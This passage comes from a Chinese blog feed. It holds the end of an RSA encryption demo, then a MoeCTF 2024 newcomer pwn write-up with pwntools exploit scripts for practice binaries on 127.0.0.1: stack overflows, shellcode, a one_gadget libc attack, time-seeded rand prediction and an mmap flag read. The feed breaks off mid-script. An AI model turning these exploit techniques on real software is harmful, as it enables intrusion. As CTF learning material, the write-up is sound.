encrypted_text):<br>    # 使用 PyCrypto 加载私钥<br>    private_key = RSA.<span class="hljs-built_in">importKey</span>(private_key_pem_str.<span class="hljs-built_in">encode</span>())<br>    cipher = PKCS1_OAEP.<span class="hljs-built_in">new</span>(private_key)<br><br>    # 解密文本<br>    encrypted_bytes = base64.<span class="hljs-built_in">b64decode</span>(encrypted_text)<br>    decrypted_text = cipher.<span class="hljs-built_in">decrypt</span>(encrypted_bytes).<span class="hljs-built_in">decode</span>()<br>    return decrypted_text<br><br><br>def <span class="hljs-built_in">main</span>(text):<br>    private_pem, public_pem = <span class="hljs-built_in">generate_rsa_keys</span>()<br>    # 使用公钥加密文本<br>    encrypted_text = <span class="hljs-built_in">encrypt_text</span>(public_pem, text)<br>    # <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;Encrypted text: &#123;encrypted_text&#125;&quot;</span>)<br><br>    # 使用私钥解密文本<br>    decrypted_text = <span class="hljs-built_in">decrypt_text</span>(private_pem, encrypted_text)<br>    <span class="hljs-built_in">print</span>(decrypted_text)<br><br><br>if __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    text = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter text to encrypt: &quot;</span>)<br><br>    <span class="hljs-built_in">main</span>(text)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应用密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AES</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>moe2024新生赛--pwn篇</title>
    <link href="/2024/10/23/moe2024%E6%96%B0%E7%94%9F%E8%B5%9B--pwn%E7%AF%87/"/>
    <url>/2024/10/23/moe2024%E6%96%B0%E7%94%9F%E8%B5%9B--pwn%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h3 id="moe2024新生赛–pwn篇"><a href="#moe2024新生赛–pwn篇" class="headerlink" title="moe2024新生赛–pwn篇"></a>moe2024新生赛–pwn篇</h3><p>[TOC]</p><h4 id="1-二进制漏洞审计入门指北"><a href="#1-二进制漏洞审计入门指北" class="headerlink" title="1 二进制漏洞审计入门指北"></a><strong>1 二进制漏洞审计入门指北</strong></h4><p>nc直取<del>(不过一点点打印出来确实有点带感，让普普通通的命令行打印更加，唔，酷？…好吧，一点点打印只是因为与服务器有延迟，我还以为特地这么设计的呢，我是呆逼)</del></p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409172210281.png" alt="image-20240917220957194"></p><h4 id="2-NotEnoughTime"><a href="#2-NotEnoughTime" class="headerlink" title="2 NotEnoughTime"></a>2 NotEnoughTime</h4><p>先是一点正则表达式的解释—来自gpt</p><p>这个正则表达式 <code>r&#39;[-+/*]?\s*\d+&#39;</code> 用来从给定的字符串中提取数字和前面的运算符，详细解释如下：</p><ol><li><code>[]</code> (字符类)</li></ol><ul><li>方括号 <code>[]</code> 用于定义一个<strong>字符类</strong>，匹配方括号中的任何一个字符。</li><li>在这里，<code>[-+/*]</code> 匹配<strong>减号</strong>(<code>-</code>)、<strong>加号</strong>(<code>+</code>)、<strong>除号</strong>(<code>/</code>)、<strong>乘号</strong>(<code>*</code>) 这四种运算符中的任意一个。</li><li>注意：减号 <code>-</code> 在字符类中放在首位，因为 <code>-</code> 在中间可能会被解释为一个范围（如 <code>[a-z]</code> 表示从 <code>a</code> 到 <code>z</code> 之间的字符）。</li></ul><ol start="2"><li><code>?</code> (零次或一次)</li></ol><ul><li><code>?</code> 是量词，用来匹配前面的内容<strong>零次或一次</strong>。在这个表达式里，<code>[-+/*]?</code> 表示<strong>可能有</strong>一个运算符，也可能没有。</li><li>这意味着可以匹配诸如 <code>+3</code>、<code>-5</code> 或者 <code>6</code> 这样的数字，前面的运算符是可选的。</li></ul><ol start="3"><li><code>\s*</code> (零次或多次空白字符)</li></ol><ul><li><code>\s</code> 匹配<strong>空白字符</strong>，包括空格、制表符、换行符等。</li><li><code>*</code> 是量词，表示前面的空白字符可以出现<strong>零次或多次</strong>。</li><li>所以 <code>\s*</code> 意味着可以有空格或没有空格，也就是忽略了数字和运算符之间的空白。</li></ul><ol start="4"><li><code>\d+</code> (一位或多位数字)</li></ol><ul><li><code>\d</code> 匹配<strong>任意数字</strong>，即 <code>0-9</code> 的数字。</li><li><code>+</code> 是量词，表示前面的数字字符可以出现<strong>一次或多次</strong>。因此，<code>\d+</code> 匹配的是<strong>一个或多个数字</strong>，例如 <code>5</code>、<code>123</code>。</li></ul><p> 结合在一起的解释：</p><ul><li><code>[-+/*]?\s*\d+</code> 这个正则表达式的含义是：<ul><li><strong>可选的</strong>运算符 <code>-</code>, <code>+</code>, <code>/</code>, <code>*</code>（零次或一次）。</li><li><strong>可选的</strong>空白字符（零次或多次）。</li><li><strong>一个或多个数字</strong>。</li></ul></li></ul><p>因此，它可以匹配如下形式的片段：</p><ul><li><code>250</code></li><li><code>-655</code></li><li><code>+395</code></li><li><code> /399</code>（带有空格）</li></ul><p>正则表达式相关的知识点：</p><ol><li><p><strong>正则表达式的基本语法</strong>：</p><ul><li>使用字符类 <code>[]</code> 来定义一个可能匹配的字符集。</li><li>使用 <code>?</code>, <code>*</code>, <code>+</code> 等量词来控制字符的重复次数。</li><li>使用转义字符如 <code>\d</code> 来表示某一类字符（例如数字）。</li></ul></li><li><p><strong>字符类匹配</strong>：</p><ul><li><code>[-+/*]</code> 中的 <code>-</code> 表示减号，而不是字符范围。若要匹配减号，通常放在字符类的第一个位置避免歧义。</li></ul></li><li><p><strong>量词控制</strong>：</p><ul><li><code>?</code> 量词在这里用于处理数字前的运算符是否存在的情况。</li></ul></li><li><p><strong>空白字符的忽略</strong>：</p><ul><li><code>\s*</code> 的使用使得数学式中的空白字符可以被忽略，确保提取表达式时不受空格干扰。</li></ul></li></ol><p>通过这些知识，正则表达式可以帮助你准确地提取数学表达式中的有效数字和符号部分。</p><p>注意向下取整即可，不能直接用int取整数位（因为会有负数），注意要解码后才能使用</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> math<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">41661</span>)<br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br>rl()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">22</span>):<br>    strs = ru(<span class="hljs-string">&#x27;=&#x27;</span>)<br>    strs = re.findall(<span class="hljs-string">r&#x27;[-+/*]?\s*\d+&#x27;</span>,strs.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    strs = <span class="hljs-string">&#x27;&#x27;</span>.join(strs)<br>    <span class="hljs-built_in">print</span>(strs)<br>    <span class="hljs-comment">#pause()</span><br>    success(<span class="hljs-string">f&quot;it is the times :<span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>    sl(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(math.floor((<span class="hljs-built_in">eval</span>(strs))))))<br>    <span class="hljs-comment">#sleep(0.1)</span><br><br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="3-no-more-gets"><a href="#3-no-more-gets" class="headerlink" title="3 no_more_gets"></a>3 no_more_gets</h4><p>栈溢出跳转shell（注意栈平衡）</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181303966.png" alt="image-20240918130322893"></p><p>exp:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./lockedshell&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">46363</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>back=<span class="hljs-number">0x0401193</span><br>payload = b<span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0x58</span>)+p64(back)<br><br><span class="hljs-comment">#debug()</span><br>sl(payload)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="4-leak-sth"><a href="#4-leak-sth" class="headerlink" title="4 leak_sth"></a>4 leak_sth</h4><p>存在格式化字符串漏洞来泄露伪随机数，不过自身构建随机数也行</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181312991.png" alt="image-20240918131238901"></p><p>exp:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>from ctypes import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./leak_sth&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">38901</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>dll=cdll.<span class="hljs-title class_">LoadLibrary</span>(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>seed =time.time()<br>a=int(seed)<br>dll.srand(a)<br><br>ru(<span class="hljs-string">&#x27;name&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;xyyr&#x27;</span>)<br>sl(str(dll.rand()))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="5-ez-shellcode"><a href="#5-ez-shellcode" class="headerlink" title="5 ez_shellcode"></a>5 ez_shellcode</h4><p>给出栈的地址，并且开了可执行权限，在栈上写入shellcode再跳转回来即可</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181613307.png" alt="image-20240918161337231"></p><p>exp:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">45179</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>ru(<span class="hljs-string">&#x27;age&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;-1&#x27;</span>)<br>rl()<br>rl()<br>stack_addr = int(rl(),<span class="hljs-number">16</span>)<br>print(hex(stack_addr))<br>shellcode = asm(shellcraft.sh())<br>payload = shellcode.ljust(<span class="hljs-number">0x68</span>,b<span class="hljs-string">&quot;A&quot;</span>)+p64(stack_addr)<br>sd(payload)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="6-这是什么？libc"><a href="#6-这是什么？libc" class="headerlink" title="6 这是什么？libc"></a>6 这是什么？libc</h4><p>给出libc地址，直接全用libc打栈溢出即可。本来想常规system，但是懒得再指令找寄存器，突然想起还有onegadget，直接梭（没想到第一个就出来了）</p><p>（这里又练习了一下用正则表达式匹配，不知道为什么顺序必须是先0-9再a-f才能正常匹配）</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181645088.png" alt="image-20240918164515012"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> re<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">36525</span>)<br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>strs=p.recv()<br><br>puts_addr = re.findall(<span class="hljs-string">r&#x27;0x[0-9a-f]+&#x27;</span>,strs.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>puts_addr = <span class="hljs-string">&#x27;&#x27;</span>.join(puts_addr)<br>puts_addr = <span class="hljs-built_in">int</span>(puts_addr,<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>onegad = [<span class="hljs-number">0x50a47</span>,<span class="hljs-number">0xebc81</span>,<span class="hljs-number">0xebc85</span>,<span class="hljs-number">0xebc88</span>,<span class="hljs-number">0xebce2</span>,<span class="hljs-number">0xebd3f</span>,<span class="hljs-number">0xebd43</span>]<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">9</span> + p64(libc_base+onegad[<span class="hljs-number">0</span>])<br>sd(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="7-这是什么？shellcode"><a href="#7-这是什么？shellcode" class="headerlink" title="7 这是什么？shellcode"></a>7 这是什么？shellcode</h4><p>懒得自己写shellcode，还是用了shellcraft.sh(),这里原本有个call buf，但是会导致反汇编为伪代码失败，先直接nop掉了</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181657463.png" alt="image-20240918165719400"></p><p>exp就是直接输入生成shell.没有加过滤来强迫自己写shellcode（那就懒得自己写喽，嘿嘿）</p><h4 id="8-这是什么？random"><a href="#8-这是什么？random" class="headerlink" title="8 这是什么？random"></a>8 这是什么？random</h4><p>只需要答对利用时间戳的10次伪随机即可</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181739628.png" alt="image-20240918173904515"></p><p>中间出了问题，动调进去看，localtime的参数是这个时间戳</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181739111.png" alt="image-20240918173924085"></p><p>转化后就是对应的今天</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181739235.png" alt="image-20240918173958193"></p><p>但是srandom的参数是0x105&#x3D;261</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181740053.png" alt="image-20240918174029029"></p><p>但是我这里多了一天？？</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181741287.png" alt="image-20240918174123224"></p><p>把这儿的减了1就行了，但是不知道为什么会导致二者不一致，明明time.time()生成出来的一样。</p><p>查的一点点只是秒的差距，按理说没影响。转化出来的16进制数为0x66EAA093</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409181743522.png" alt="image-20240918174354471"></p><p>经过各种查询，我写这个的时候的当天就是262！！！！</p><p>呜呜呜，不懂，坐等大佬教。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./prerandom&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;127.0.0.1&#x27;,35857)</span><br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>dll=cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>gdb.attach(p,<span class="hljs-string">&#x27;main&#x27;</span>)<br><br>timer = time.time()<span class="hljs-comment">#==time(0)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(timer))<br>v3 = time.localtime(<span class="hljs-built_in">int</span>(timer))<br><span class="hljs-built_in">print</span>(v3)<br>seed = v3.tm_yday-<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(seed)<br><br><br>dll.srand(seed)<br><span class="hljs-comment">#debug()</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>):<br>    sl(<span class="hljs-built_in">str</span>(dll.rand() % <span class="hljs-number">90000</span>+<span class="hljs-number">10000</span>))<span class="hljs-comment">#the first is 70083 by debug because of seed is day.</span><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="9-flag-helper"><a href="#9-flag-helper" class="headerlink" title="9 flag_helper"></a>9 flag_helper</h4><p>本来随便试了试，试不出来，发现可以把提示开了，根据提示磨出来了。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182226330.png" alt="image-20240918222641263"></p><p>首先是4个选项</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182229029.png" alt="image-20240918222952007"></p><ul><li><p>一个个试了，1选了又回来了，重复这个循环；2退出；3会卡死；只有4有一些交互</p></li><li><p>选择4后让说路径，尝试了&#x2F;，&#x2F;root，&#x2F;ctf,&#x2F;pwn，最后看了提示才知道&#x2F;flag</p></li><li><p>然后让给出flags来打开，已知0、1、2有特殊含义，3试了之后被拒绝，然后用4，发现输出了一系列打开</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182233403.png"></p></li></ul><p>这里flag文件时第3个，文件描述符为5（后面会用到）</p><ul><li><p>prot权限选择<br><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182234200.png" alt="image-20240918223413167"></p><p>1：可读，2：可写，4：可执行。本来想着可读就行，最后不行，所以干脆给了7（可读可写可执行）</p><p>不过据说如果open没有那么高的权限的话，mmap如果赋予更高会出错。（不过这里可以）</p></li><li><p>然后问flags，下面是一些参数，由于提示mmap传入的fd是-1，所以要用匿名映射，由于匿名映射不能访问文件，还有创建私有映射，所以填了33（34也可以）（按理说这么分析，但是我是爆破出来的，当时脑子有点不在线）</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182234976.png" alt="image-20240918223435924"></p></li><li><p>最后问文件的fd值，显然是5。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409182240807.png" alt="image-20240918223757935"></p></li></ul><p>exp：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./&#x27;)</span><br><span class="hljs-comment">#p=remote(&#x27;127.0.0.1&#x27;,35921)</span><br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">for i in range (40):</span><br><span class="hljs-string">    p=remote(&#x27;</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">&#x27;,38747)</span><br><span class="hljs-string">    sl(b&#x27;</span><span class="hljs-number">4</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    rl()</span><br><span class="hljs-string">    sl(&#x27;</span>/flag<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    rl()</span><br><span class="hljs-string">    rl()</span><br><span class="hljs-string">    sl(b&#x27;</span><span class="hljs-number">4</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    rl()</span><br><span class="hljs-string">    sl(b&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    rl()</span><br><span class="hljs-string">    sl(str(f&#x27;</span>&#123;i&#125;<span class="hljs-string">&#x27;))</span><br><span class="hljs-string">    p.interactive()</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">45215</span>)<br>sl(b<span class="hljs-string">&#x27;4&#x27;</span>)<br>rl()    <br>sl(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>rl()<br>rl()<br>sl(b<span class="hljs-string">&#x27;4&#x27;</span>)<br>rl()<br>sl(b<span class="hljs-string">&#x27;7&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;flags&#x27;</span>)<br>sl(b<span class="hljs-string">&#x27;33&#x27;</span>)<br>rl()<br>sl(b<span 